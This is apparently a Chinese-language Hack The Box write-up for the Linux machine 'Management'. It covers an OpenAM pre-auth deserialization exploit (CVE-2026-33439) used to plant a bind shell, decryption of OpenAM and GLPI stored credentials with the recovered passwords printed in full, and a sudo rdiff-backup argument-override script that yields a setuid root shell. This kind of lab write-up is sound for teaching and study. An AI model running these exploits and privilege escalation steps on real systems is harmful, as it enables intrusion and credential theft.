---
title: "Management - Linux - Easy"
date: 2026-10-19
draft: false
description: "Management 是一台 Easy 难度的 Linux 机器。前端 bundle 经 AES-GCM 加密后 eval，解出的 Client login 通向 OpenAM，用 CVE-2026-33439 拿到立足点；再从 OpenAM 配置解出凭据，密码在 GLPI 上复用，最后用 sudo rdiff-backup 的参数覆盖提权到 root。"
tags: ["Linux"]
categories: ["Writeup"]
isStarred: false
---

Management 是一台 Easy 难度的 Linux 机器。前端 bundle 经 AES-GCM 加密后 eval，解出的 Client login 通向 OpenAM，用 CVE-2026-33439 拿到立足点；再从 OpenAM 配置解出凭据，密码在 GLPI 上复用，最后用 sudo rdiff-backup 的参数覆盖提权到 root。

| 项目 | 值 |
| :--- | :--- |
| 平台 | Hack The Box |
| 系统 | Linux（Ubuntu 24.04.5，kernel 6.8.0-139） |
| 难度 | Easy |
| 靶机 IP | 10.129.5.96 |

## 0. 攻击链总览

单机靶机。入口是 OpenAM 的预认证反序列化，凭据链从 OpenAM 配置传到 GLPI，最后落在 sudo 通配符上。

### 工具

| 工具 | 用途 |
| :--- | :--- |
| nmap | 端口扫描 |
| vhost 枚举 | 子域发现 |
| python3 | CVE-2026-33439 反序列化 payload |
| nuclei | 漏洞模板来源 |
| ldapsearch | OpenDJ 目录查询 |
| curl | OpenAM / GLPI 接口 |
| nc | bind shell |
| ssh | 登录靶机 |
| rdiff-backup | sudo 提权 |

## 1. 侦察

```console
imawuya:~$ nmap -Pn -sT -p22,80,443,50389 --min-rate 2000 10.129.5.96
Nmap scan report for 10.129.5.96
Host is up (0.35s latency).
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
50389/tcp open  ldap
```

```console
imawuya:~$ echo '10.129.5.96 management.htb sso.management.htb' | sudo tee -a /etc/hosts
10.129.5.96 management.htb sso.management.htb

imawuya:~$ curl -skI https://10.129.5.96/
HTTP/1.1 301 Moved Permanently
Location: https://management.htb/
```

主站是营销页。前端 bundle 不是明文 JS，而是一个 `assets/app.enc`，由页面里硬编码的 AES-GCM 密钥解密后再 `eval`。解出来的代码里只有普通的页面逻辑，但页脚有一个 **Client login**，指向：

```
https://sso.management.htb/
```

vhost 枚举只命中 `sso`，站点是 OpenAM 16.0.5（Open Identity Platform）。

## 2. 初始访问：CVE-2026-33439

OpenAM ≤ 16.0.5 的 `jato.clientSession` 参数存在预认证 Java 反序列化。CVE-2021-35464 之后官方加了 `WhitelistObjectInputStream`，这个洞绕过了白名单。

- 端点：`GET /openam/ui/PWResetUserValidation?jato.clientSession=<base64url(payload)>`
- 利用链来自 nuclei 模板：Xalan `TemplatesImpl` + `ObjTranslator`
- 模板里的命令是 OAST 占位符，需要替换命令并重算三处长度字段：命令长度（`LEN_OFF`）、数组长度（`ARR_OFF`）、payload 总长（`CMD_OFF`）

```console
imawuya:~$ python3 exploits/cve-2026-33439/exploit.py 'id'
cmd: id payload_len: ...
...
```

命令以 `openam` 用户（uid 996）执行。用一个 Python bind shell 落地，省去反向连接的出网问题（具体命令未保留，以下为当时的形态）：

```console
imawuya:~$ python3 exploits/cve-2026-33439/exploit.py 'nohup bash -c "<python bind shell 4447>" >/dev/null 2>&1'
cmd: nohup bash -c ... payload_len: ...
...

imawuya:~$ nc 10.129.5.96 4447
id
uid=996(openam) gid=... groups=...
```

产物：`exploits/cve-2026-33439/exploit.py` 与 `nuclei.yaml`。

## 3. 从 OpenAM 配置里解凭据

`openam` 用户能读整个 OpenAM 目录，包括 **配置存储** 和 **OpenDJ 数据目录**。两条线同时走：

### 3.1 离线导出 OpenDJ

```console
openam@management:/opt/openam$ cp -a config/opends /tmp/opends
openam@management:/opt/openam$ INSTANCE_ROOT=/tmp/opends ... export-ldif --ldifFile /tmp/exp.ldif ...
...
Exported 583 entries
```

导出 583 条记录，其中带 `userPassword` 密文。

### 3.2 解 `am.encryption.pwd`

配置里能直接读到 `am.encryption.pwd`。它保护的是 OpenAM 的配置项密码。直接静态调用 `JCECrypt.decode` 会因为缺少初始化上下文返回 `null`，最短路径是把一个 JSP 部署到 webapp 里，在运行中的容器内调用：

```console
openam@management:/opt/openam-tomcat/webapps/openam$ ls dec*.jsp
dec.jsp
# 浏览器/curl 访问该 JSP，得到
cn=Directory Manager / rCi5i6A7zqAf
amAdmin              / dnnWCs5e6+d5+P1YZ3fL8rCE6IE=
```

### 3.3 Directory Manager 绑定

```console
imawuya:~$ ldapsearch -x -H ldap://10.129.5.96:50389 \
  -D 'cn=Directory Manager' -w 'rCi5i6A7zqAf' -b 'dc=management,dc=htb' ...
...
# 身份库里只有 demo，没有 owen
```

身份库很小，只有 `demo` 一个账号，没有 `owen`。`demo` 的 SSHA 用字典跑出 `changeit`，与本条路径无关，只说明身份库和系统账号是两套。

## 4. GLPI 与被复用的密码

OpenAM 所在主机同时跑着 GLPI。配置文件可读：

```console
openam@management:/opt/glpi/config$ grep -E "db|rootdn" config_db.php
$dbhost = 'localhost';
$dbuser = 'glpi';
$dbpassword = '8rhu0L6Pw4Y7';
...
'glpi_authldaps' => ['rootdn_passwd' => '<GLPIKey 密文>'],
```

GLPI 的 LDAP bind 密码用 GLPIKey（XChaCha20-Poly1305）加密，密钥在 `config/glpicrypt.key`。解密得到：

```
WpczC40GhTbk
```

这个密码在系统用户上复用了：

```console
imawuya:~$ ssh owen@10.129.5.96
owen@management:~$ id
uid=1000(owen) gid=1000(owen) groups=1000(owen) ...

owen@management:~$ cat user.txt
********************************
```

## 5. 提权：sudo rdiff-backup 参数覆盖

```console
owen@management:~$ sudo -l
Matching Defaults entries for owen on management:
    ...

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

sudoers 规则尾部是通配符 `*`，可以追加任意参数；而 rdiff-backup 的 argparse 对重复选项取**最后一个值**。于是安全限制可以被调用方自己覆盖：

```console
owen@management:~$ cp /bin/bash /tmp/rootbash

owen@management:~$ python3 /tmp/rc3.py /tmp/rootbash
remote: ...
chown: None
chmod: None
```

`/tmp/rc3.py` 用 rdiff-backup 的 `PipeConnection` 直接连上这个以 root 运行的 server 进程，调用其 `os.chown` / `os.chmod`：

```python
cmd = ("sudo -n /usr/bin/rdiff-backup --server --restrict-path /opt/backup "
       "--restrict-mode read-only --restrict-path / --restrict-mode read-write --force")
p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
cn = connection.PipeConnection(p.stdout, p.stdin, n, p)
...
cn.os.chown(path, 0, 0)
cn.os.chmod(path, 0o4755)
```

效果：

```console
owen@management:~$ /tmp/rootbash -p -c 'id; cat /root/root.txt'
uid=1000(owen) gid=1000(owen) euid=0(root) ...
********************************
```

## 6. 收尾

清理掉的落地文件与进程：

```
/tmp/rootbash
/tmp/opends
/tmp/exp.ldif
/tmp/rr.py
/tmp/rc*.py
/tmp/T.java
/tmp/ListM.java
/tmp/Dec*.java
/tmp/findjar.py
/opt/openam-tomcat/webapps/openam/dec*.jsp
bind shell 进程（4447 已关闭）
```

## 附录：走过的弯路与兔子洞

1. **全端口扫描超时**：`-p- --host-timeout 600s` 跑满 10 分钟只拿到一句 `Skipping host ... due to host timeout`，扫描文件是空的。改用指定端口 + 提高 `--min-rate` 才拿到 22/80/443/50389。
2. **匿名 LDAP 绑定**：50389 允许匿名 bind，但 ACL 拒绝读取任何条目。看起来像入口，实际只能用 Directory Manager 或服务账号。
3. **身份库与系统账号是两套**：OpenDJ 里只有 `demo`（`changeit`），`owen` 不在里面；不要把 LDIF 里的账号直接当 SSH 账号试。
4. **`JCECrypt` 静态调用**：在命令行里直接 new 一个 `JCECrypt` 去 decode，会因为没有初始化配置返回 `null`。必须在运行中的 OpenAM 容器里（部署 JSP）执行。
5. **前端 bundle**：`app.enc` 的 AES-GCM 密钥硬编码在页面里，解出来只是营销页逻辑；真正的入口是页脚那个 SSO 链接。
6. **rdiff-backup 的 `--force`**：只覆盖 `--restrict-path` / `--restrict-mode` 还不够，`--force` 用来跳过 server 端的一致性检查；不加会在建立连接时被拒绝。
